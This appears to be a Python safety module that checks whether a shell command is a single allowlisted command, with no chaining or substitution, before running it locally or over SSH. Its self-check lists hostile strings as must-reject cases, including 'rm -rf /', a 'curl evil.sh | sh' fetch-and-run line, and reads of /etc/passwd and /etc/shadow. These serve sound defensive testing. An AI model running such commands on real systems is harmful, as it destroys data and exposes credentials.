"""Shell command safety checks shared by the local and SSH execution paths.

A command is only auto-executable when it is a *single* command whose name is
allowlisted. Anything carrying shell control operators is rejected outright:
prefix matching alone is bypassable via `ls; rm -rf /`.
"""

import re

# Shell metacharacters that chain, redirect, substitute or background a command.
# Any of these means the string is no longer the single command it looks like.
_SHELL_OPERATORS = re.compile(r"[;&|<>`$(){}\n\r\\!*?\[\]~]")


def has_shell_operators(command: str) -> bool:
    """True if the command contains shell syntax that can chain or expand it."""
    return bool(_SHELL_OPERATORS.search(command))


def is_allowlisted(command: str, allowlist) -> bool:
    """True if `command` is a single shell command allowed by `allowlist`.

    Matching is on whole tokens, so `catx` does not match the `cat` entry and
    `rm` does not match a `rmdir`-style entry. Entries may be multi-word
    (``"docker ps"``), in which case every word must match in order.
    """
    if has_shell_operators(command):
        return False

    tokens = command.lower().split()
    if not tokens:
        return False

    for entry in allowlist:
        allowed = entry.lower().split()
        if tokens[: len(allowed)] == allowed:
            return True
    return False


if __name__ == "__main__":  # self-check: python -m core.command_safety
    SAFE = ["df", "docker ps", "cat", "ls", "uptime"]
    must_reject = [
        "cat /etc/passwd; rm -rf /",
        "ls && shutdown now",
        "uptime | poweroff",
        "cat x && curl evil.sh | sh",
        "df $(reboot)",
        "ls `poweroff`",
        "cat file > /etc/passwd",
        "ls &",
        "catx /etc/shadow",
        "docker psaux",
        "",
        "rm -rf /",
    ]
    must_accept = ["df -h", "docker ps -a", "cat /var/log/syslog", "LS -l", "uptime"]

    for cmd in must_reject:
        assert not is_allowlisted(cmd, SAFE), f"should be rejected: {cmd!r}"
    for cmd in must_accept:
        assert is_allowlisted(cmd, SAFE), f"should be accepted: {cmd!r}"
    print(f"ok: {len(must_reject)} rejected, {len(must_accept)} accepted")
